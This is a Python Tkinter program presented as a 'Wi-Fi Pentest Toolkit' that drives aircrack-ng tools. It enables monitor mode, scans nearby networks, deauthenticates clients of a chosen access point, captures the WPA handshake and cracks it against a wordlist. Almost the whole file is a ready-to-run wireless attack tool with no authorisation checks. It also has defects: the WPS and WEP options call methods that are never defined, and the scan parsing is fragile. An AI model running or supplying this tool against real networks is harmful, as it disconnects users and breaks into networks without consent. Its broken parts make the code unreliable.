import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import subprocess
import threading
import os

class WiFiPentestGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Wi-Fi Pentest Toolkit")
        self.interface = "wlan0"  # Change to your interface
        self.mon_interface = "wlan0mon"
        self.wordlist = "/usr/share/wordlists/rockyou.txt"
        self.output_dir = "captures"
        
        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Setup GUI
        self.create_widgets()
        self.enable_monitor_mode()

    def create_widgets(self):
        # Notebook (Tabs)
        self.notebook = ttk.Notebook(self.root)
        
        # Scan Tab
        self.scan_frame = ttk.Frame(self.notebook)
        self.create_scan_tab()
        
        # Attack Tab
        self.attack_frame = ttk.Frame(self.notebook)
        self.create_attack_tab()
        
        self.notebook.add(self.scan_frame, text="Network Scan")
        self.notebook.add(self.attack_frame, text="Attacks")
        self.notebook.pack(expand=True, fill="both")

        # Console Output
        self.console = scrolledtext.ScrolledText(self.root, height=10)
        self.console.pack(fill="both", expand=True)

    def create_scan_tab(self):
        # Scan Controls
        ttk.Button(self.scan_frame, text="Start Scan", command=self.start_scan).grid(row=0, column=0, padx=5, pady=5)
        ttk.Button(self.scan_frame, text="Stop Scan", command=self.stop_scan).grid(row=0, column=1, padx=5, pady=5)
        
        # Scan Results Treeview
        self.scan_tree = ttk.Treeview(self.scan_frame, columns=("BSSID", "Channel", "ESSID", "Power", "Crypto"))
        self.scan_tree.heading("#0", text="#")
        self.scan_tree.heading("BSSID", text="BSSID")
        self.scan_tree.heading("Channel", text="Channel")
        self.scan_tree.heading("ESSID", text="ESSID")
        self.scan_tree.heading("Power", text="Power")
        self.scan_tree.heading("Crypto", text="Encryption")
        self.scan_tree.grid(row=1, column=0, columnspan=2, sticky="nsew")

    def create_attack_tab(self):
        # Attack Selection
        ttk.Label(self.attack_frame, text="Select Attack:").grid(row=0, column=0)
        self.attack_type = ttk.Combobox(self.attack_frame, values=["WPA/WPA2", "WPS", "WEP"])
        self.attack_type.grid(row=0, column=1)
        
        # Target Inputs
        ttk.Label(self.attack_frame, text="BSSID:").grid(row=1, column=0)
        self.target_bssid = ttk.Entry(self.attack_frame)
        self.target_bssid.grid(row=1, column=1)
        
        ttk.Label(self.attack_frame, text="Channel:").grid(row=2, column=0)
        self.target_channel = ttk.Entry(self.attack_frame)
        self.target_channel.grid(row=2, column=1)
        
        # Start Attack Button
        ttk.Button(self.attack_frame, text="Launch Attack", command=self.launch_attack).grid(row=3, column=0, columnspan=2)

    def enable_monitor_mode(self):
        self.log("Enabling monitor mode...")
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        subprocess.run(["airmon-ng", "start", self.interface], stdout=subprocess.DEVNULL)

    def start_scan(self):
        self.log("Starting network scan...")
        self.scan_process = subprocess.Popen(
            ["airodump-ng", self.mon_interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        self.scan_thread = threading.Thread(target=self.parse_scan_output)
        self.scan_thread.start()

    def parse_scan_output(self):
        while True:
            line = self.scan_process.stdout.readline()
            if not line:
                break
            if "BSSID" in line:
                continue  # Skip header
            parts = line.strip().split()
            if len(parts) >= 14:
                self.scan_tree.insert("", "end", values=(
                    parts[0],  # BSSID
                    parts[5],  # Channel
                    " ".join(parts[13:]),  # ESSID
                    parts[8],  # Power
                    parts[6]   # Encryption
                ))

    def stop_scan(self):
        self.scan_process.terminate()
        self.log("Scan stopped")

    def launch_attack(self):
        attack = self.attack_type.get()
        bssid = self.target_bssid.get()
        channel = self.target_channel.get()
        
        if attack == "WPA/WPA2":
            threading.Thread(target=self.wpa_attack, args=(bssid, channel)).start()
        elif attack == "WPS":
            threading.Thread(target=self.wps_attack, args=(bssid,)).start()
        elif attack == "WEP":
            threading.Thread(target=self.wep_attack, args=(bssid, channel)).start()

    def wpa_attack(self, bssid, channel):
        self.log(f"Starting WPA attack on {bssid}")
        cap_file = os.path.join(self.output_dir, f"wpa_{bssid.replace(':', '')}")
        
        # Start capture
        airodump = subprocess.Popen(
            ["airodump-ng", "-c", channel, "--bssid", bssid, "-w", cap_file, self.mon_interface],
            stdout=subprocess.DEVNULL
        )
        
        # Deauth attack
        subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, self.mon_interface])
        
        # Crack
        result = subprocess.run(
            ["aircrack-ng", "-w", self.wordlist, f"{cap_file}-01.cap"],
            capture_output=True,
            text=True
        )
        self.log(result.stdout)
        airodump.terminate()

    def log(self, message):
        self.console.insert("end", f"{message}\n")
        self.console.see("end")

    def on_close(self):
        subprocess.run(["airmon-ng", "stop", self.mon_interface])
        subprocess.run(["service", "network-manager", "restart"])
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = WiFiPentestGUI(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()